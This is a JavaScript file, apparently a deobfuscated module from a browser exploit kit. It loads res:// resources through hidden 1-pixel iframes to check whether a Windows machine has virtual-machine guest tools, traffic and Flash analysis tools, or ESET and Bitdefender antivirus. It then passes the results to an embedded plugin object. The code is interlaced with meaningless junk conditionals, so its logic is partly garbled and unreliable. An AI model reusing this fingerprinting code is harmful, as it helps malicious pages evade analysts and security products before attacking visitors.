var config_dict, list_tools, list_tool_names, result_loaded, nb_tools, nb_loaded_iframes, nb_soft_found, results, start_time, c, d, n, o, l, h, f, i, a, p, t, k;
(function () {
	var v = {
		"OK" : "OK"
	}; //(decode_string)("...replaced already");
	function build_dictionary() {
		//...replaced already
	}
	function decode_string(h, a) {
		//...replaced already
	}
	function start_checking_process(d, b) {
		if (onCheckState == 0) {
			return;
		} else {
			my_log("[START] checking process ...");
		};
		my_log("Software for checking: " + nb_tools);
		if (onCheckState == 1) {
			remove_detach_event();
			my_onFailed = 1;
			return;
		};
		var a = new Date();
		start_time = a["getTime"]();
		config_dict["successCallback"] = my_onSuccess;
		config_dict["failCallback"] = my_onFailed;
		if (!v) {
			my_onLoad(false, 1, "removeChild", null);
			my_onSuccess = "onSuccess";
			return;
		};
		if (nb_tools < config_dict["maxParallelCheck"]) {
			if (create_append_iframe === null) {
				return;
			};
			config_dict["maxParallelCheck"] = nb_tools;
		};
		if (finish_checking_process === 0) {
			delete_one_iframe = false;
		};
		var c = 0;
		for (c = 0; c < config_dict["maxParallelCheck"]; c++) {
			create_append_iframe(config_dict["frameName"] + c);
			check_one_element(config_dict["frameName"] + c);
		}
	}
	if (my_log === " ===") {
		my_onSuccess();
	};
	function check_one_element(frameName) {
		if (!v) {
			return;
		};
		if (nb_loaded_iframes == nb_tools) {
			if (!onCheckState) {
				finish_checking_process = "failCallback";
				return;
			};
			finish_checking_process();
			return;
		};
		if (0 == list_tools["length"]) {
			if (!v) {
				delete_one_iframe = 1;
			} else {
				return;
			}
		};
		if (!my_log) {
			check_one_element();
			my_onLoad = 1;
			return;
		};
		var one_element = list_tools["pop"]();
		if (!my_onLoad) {
			my_onFailed("getElementsByTagName");
		};
		my_log("=== Checking element: " + one_element["name"] + ", on iframe: " + frameName + " ===");
		results[frameName] = {
			"name" : one_element["name"],
			"type" : one_element["type"],
			"loading" : 0,
			"interactive" : 0,
			"complete" : 0
		};
		var my_iframe = document["getElementById"](frameName);
		if (!v) {
			return;
		};
		my_iframe["setAttribute"]("src", one_element["res"]);
	}
	function onCheckState(frameName) {
		var soft_name = results[frameName]["name"];
		//current_state in {"loading", "interactive", "complete"}
		var current_state = document["getElementById"](frameName)["readyState"];
		my_log("onCheckState: iframe: " + frameName + ", state: " + current_state + ", software: " + soft_name);
		if (!start_checking_process) {
			finish_checking_process(null, 0);
			add_attach_event = null;
		};
		results[frameName][current_state]++;
	}
	function my_onLoad(frameName) {
		var soft_name = results[frameName]["name"];
		var soft_type = results[frameName]["type"];
		my_log("onLoad: iframe loaded: " + frameName);
		if (results[frameName]["interactive"] > 1) {
			my_log("[FOUND]: " + soft_name);
			result_loaded["push"](soft_name + ":" + soft_type);
			if (!my_onLoad) {
				add_attach_event = 0;
				return;
			};
			var a = 0;
			for (a = 0; a < list_tool_names["length"]; a++) {
				if (!start_checking_process) {
					return;
				};
				if (soft_name == list_tool_names[a]) {
					nb_soft_found++;
				}
			}
		} else {
			if (!v) {
				my_onFailed();
				return;
			} else {
				my_log("[NOT FOUND]: " + soft_name);
			}
		};
		if (decode_string == null) {
			finish_checking_process = 0;
		};
		nb_loaded_iframes++;
		check_one_element(frameName);
	}
	function finish_checking_process() {
		my_log("[FINISH] checking process");
		if (finish_checking_process === false) {
			add_attach_event = null;
		} else {
			var a = new Date();
		};
		if (start_checking_process == 1) {
			return;
		};
		var diff_time = a["getTime"]() - start_time;
		if (0 == nb_soft_found) {
			my_log("Calling successCallback");
			config_dict["successCallback"](result_loaded, diff_time);
		} else {
			my_log("Calling failCallback");
			if (!onCheckState) {
				create_append_iframe = true;
				return;
			};
			config_dict["failCallback"](result_loaded, diff_time);
		};
		var b = 0;
		if (!v) {
			my_log(true, 1, "vm", 1, true);
		};
		for (b = 0; b < config_dict["maxParallelCheck"]; b++) {
			delete_one_iframe(config_dict["frameName"] + b);
		}
	}
	function my_log(data) {
		if (false === config_dict["debug"]) {
			if (!finish_checking_process) {
				check_one_element();
				return;
			} else {
				return;
			}
		};
		var a = new Date();
		var ts = a["getTime"]();
		console["log"](ts + " " + data);
	}
	function create_append_iframe(frameName) {
		function my_readystatechange() {
			if (!check_one_element) {
				remove_detach_event("embed", false);
				return;
			};
			onCheckState(frameName);
		}
		if (create_append_iframe === true) {
			start_checking_process(1);
			my_onFailed = 1;
			return;
		};
		function my_onLoad_ext() {
			if (!my_log) {
				my_onLoad();
			};
			my_onLoad(frameName);
		}
		my_log("creating iframe: " + frameName);
		var my_iframe = document["createElement"]("iframe");
		my_iframe["setAttribute"]("id", frameName);
		if (!my_onFailed) {
			my_onLoad(true, false);
			return;
		};
		my_iframe["setAttribute"]("name", frameName);
		if (!delete_one_iframe) {
			delete_one_iframe(null);
			add_attach_event = "onLoad: iframe loaded: ";
			return;
		} else {
			my_iframe["style"]["width"] = "1px";
		};
		if (!decode_string) {
			my_onSuccess(null, "id", null);
			return;
		};
		my_iframe["style"]["height"] = "1px";
		if (!start_checking_process) {
			return;
		};
		add_attach_event(my_iframe, "readystatechange", my_readystatechange);
		add_attach_event(my_iframe, "load", my_onLoad_ext);
		document["body"]["appendChild"](my_iframe);
	}
	function delete_one_iframe(frameName) {
		if (!finish_checking_process) {
			return;
		} else {
			function my_onLoad_ext2() {
				my_onLoad(frameName);
			}
		};
		function my_readystatechange2() {
			my_onLoad(frameName);
		}
		my_log("deleting iframe: " + frameName);
		if (!v) {
			my_onFailed(true);
		};
		var my_iframe = document["getElementById"](frameName);
		remove_detach_event(my_iframe, "load", my_onLoad_ext2);
		remove_detach_event(my_iframe, "readystatechange", my_readystatechange2);
		my_iframe["parentNode"]["removeChild"](my_iframe);
	}
	if (!v) {
		finish_checking_process = 0;
		return;
	};
	function add_attach_event(my_iframe, my_type, my_listener) {
		if (my_iframe["addEventListener"]) {
			my_iframe["addEventListener"](my_type, my_listener, false);
		} else {
			if (decode_string === true) {
				add_attach_event(true, 1);
			};
			if (my_iframe["attachEvent"]) {
				if (!create_append_iframe) {
					onCheckState = true;
					return;
				} else {
					my_iframe["attachEvent"]("on" + my_type, my_listener);
				}
			}
		}
	}
	if (!start_checking_process) {
		onCheckState = false;
		return;
	};
	function remove_detach_event(my_iframe, my_type, my_listener) {
		if (my_iframe["removeEventListener"]) {
			my_iframe["removeEventListener"](my_type, my_listener, false);
		} else {
			if (create_append_iframe == false) {
				finish_checking_process();
			};
			if (my_iframe["detachEvent"]) {
				if (delete_one_iframe == null) {
					return;
				};
				my_iframe["detachEvent"]("on" + my_type, my_listener);
			} else {
				if (finish_checking_process === true) {
					return;
				} else {
					my_iframe["on" + my_type] = null;
				}
			}
		}
	}
	function my_onSuccess(a, c) {
		var b = document["getElementsByTagName"]("object")[0];
		if (my_onLoad == null) {
			return;
		};
		if (typeof b["onSuccess"] == "function") {
			document["getElementsByTagName"]("object")[0]["onSuccess"](a, c);
		} else {
			document["getElementsByTagName"]("embed")[0]["onSuccess"](a, c);
		}
	}
	function my_onFailed(a, c) {
		var b = document["getElementsByTagName"]("object")[0];
		if (typeof b["onFailed"] == "function") {
			document["getElementsByTagName"]("object")[0]["onFailed"](a, c);
		} else {
			document["getElementsByTagName"]("embed")[0]["onFailed"](a, c);
		}
	}
	c = start_checking_process;
	if (!decode_string) {
		onCheckState(null);
		return;
	};
	d = check_one_element;
	n = onCheckState;
	if (!my_log) {
		my_onFailed();
	};
	o = my_onLoad;
	if (!start_checking_process) {
		start_checking_process = false;
	};
	l = finish_checking_process;
	h = my_log;
	f = create_append_iframe;
	i = delete_one_iframe;
	a = add_attach_event;
	if (!my_onFailed) {
		delete_one_iframe();
		return;
	};
	p = remove_detach_event;
	if (add_attach_event === "onSuccess") {
		return;
	};
	t = my_onSuccess;
	k = my_onFailed;

	config_dict = {
		"debug" : true,
		"maxParallelCheck" : 30,
		"frameName" : "myFrame"
	};
	list_tools = [{
			"name" : "VirtualBox Guest Additions",
			"res" : "res://C:\\Program Files\\Oracle\\VirtualBox Guest Additions\\DIFxAPI.dll/#24/123",
			"type" : "vm"
		}, {
			"name" : "VMware Tools",
			"res" : "res://C:\\Program Files\\VMware\\VMware Tools\\VMToolsHook.dll/#24/2",
			"type" : "vm"
		}, {
			"name" : "Fiddler2",
			"res" : "res://C:\\Program Files (x86)\\Fiddler2\\uninst.exe/#24/1",
			"type" : "tool"
		}, {
			"name" : "Wireshark",
			"res" : "res://C:\\Program Files (x86)\\Wireshark\\wireshark.exe/#24/1",
			"type" : "tool"
		}, {
			"name" : "FFDec",
			"res" : "res://C:\\Program Files (x86)\\FFDec\\Uninstall.exe/#24/1",
			"type" : "tool"
		}, {
			"name" : "ESET NOD32 Antivirus",
			"res" : "res://C:\\Program Files\\ESET\\ESET NOD32 Antivirus\\egui.exe/#24/1",
			"type" : "av"
		}, {
			"name" : "Bitdefender 2016",
			"res" : "res://C:\\Program Files\\Bitdefender Agent\\ProductAgentService.exe/#24/1",
			"type" : "av"
		}
	];
	if (my_onFailed === true) {
		return;
	};
	list_tool_names = ["VirtualBox Guest Additions", "VMware Tools", "Fiddler2", "Wireshark", "FFDec", "ESET NOD32 Antivirus", "Bitdefender 2016"];
	if (!v) {
		finish_checking_process = true;
	};
	result_loaded = [];
	nb_tools = list_tools["length"];
	nb_loaded_iframes = 0;
	if (!v) {
		remove_detach_event(null, true);
		onCheckState = false;
		return;
	} else {
		nb_soft_found = 0;
	};
	results = {};
	start_time = 0;
	if (decode_string === false) {
		return;
	};
	if (onCheckState == true) {
		return;
	};
	if (my_log == 0) {
		onCheckState(1, 0);
		my_onSuccess = 1;
	};
	if (!v) {
		start_checking_process();
		return;
	};
	if (!my_onSuccess) {
		my_log(false);
		return;
	};
	start_checking_process(my_onSuccess, my_onFailed);
})();
